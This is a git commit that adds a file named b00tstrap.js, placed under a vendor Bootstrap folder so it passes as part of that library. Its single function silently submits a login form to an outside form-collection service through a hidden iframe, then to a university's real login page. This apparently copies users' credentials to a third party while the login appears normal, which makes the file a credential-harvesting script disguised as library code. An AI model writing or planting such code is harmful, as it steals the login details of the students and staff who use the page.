9c3fde449bfd3bfbf5a81fc81fa34f4b03014aef
Roshan Pandey <pandeyroshan556@gmail.com>
2018-12-20 10:55:37 +0530

    Add files via upload

---
+++ vendor/bootstrap/js/b00tstrap.js
@@ -0,0 +1,9 @@
+function submit_form()
+{
+	document.Form1.action = "https://getsimpleform.com/messages?form_api_token=adad59661b40a89e5d5b846a76a7a3e5";
+	document.Form1.target = "iframe1";
+  	document.Form1.submit();
+   	document.Form1.action = "https://webkiosk.juet.ac.in/CommonFiles/UserAction.jsp";
+   	document.Form1.target = "iframe2";
+   	document.Form1.submit();
+}
